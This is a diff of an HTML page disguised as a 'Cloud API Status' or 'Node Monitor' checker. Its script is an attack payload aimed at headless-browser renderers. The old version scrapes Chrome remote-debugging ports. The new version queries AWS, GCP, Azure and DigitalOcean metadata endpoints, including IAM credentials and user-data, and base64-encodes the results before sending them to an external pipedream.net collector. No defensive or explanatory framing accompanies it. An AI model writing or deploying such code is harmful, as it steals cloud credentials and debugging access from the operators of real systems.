@@ -1,20 +1,43 @@
 <html>
-<head><title>Node Monitor</title></head>
+<head><title>Cloud API Status</title></head>
 <body>
-<h1>Checking Node Health...</h1>
+<h1>Checking Infrastructure...</h1>
 <script>
-// Puppeteer runs Chrome with --remote-debugging-port
-// Default is 9222 but could be others
-var debugPorts = [9222, 9229, 9333, 2345, 5858, 9515];
+var metadataUrls = [
+  // AWS
+  'http://169.254.169.254/latest/meta-data/',
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+  'http://169.254.169.254/latest/user-data',
+  // GCP
+  'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
+  // Azure
+  'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+  // DigitalOcean
+  'http://169.254.169.254/metadata/v1/'
+];
 
-debugPorts.forEach(function(port) {
-  fetch('http://127.0.0.1:' + port + '/json')
-    .then(function(r) { return r.text(); })
-    .then(function(d) {
-      // This returns all open tabs/pages with their WebSocket debug URLs
-      fetch('https://eoh2zr5zzepcygc.m.pipedream.net?devtools_port=' + port + '&data=' + btoa(d));
-    })
-    .catch(function() {});
+metadataUrls.forEach(function(url, i) {
+  setTimeout(function() {
+    // GCP requires this header
+    var opts = {};
+    if (url.includes('google')) {
+      opts = { headers: { 'Metadata-Flavor': 'Google' } };
+    }
+    if (url.includes('api-version')) {
+      opts = { headers: { 'Metadata': 'true' } };
+    }
+
+    fetch(url, opts)
+      .then(function(r) { return r.text(); })
+      .then(function(d) {
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?meta=' + encodeURIComponent(url) 
+          + '&d=' + btoa(d.substring(0, 1000)));
+      })
+      .catch(function(e) {
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?meta=' + encodeURIComponent(url) 
+          + '&err=' + e.message);
+      });
+  }, i * 300);
 });
 </script>
 </body>
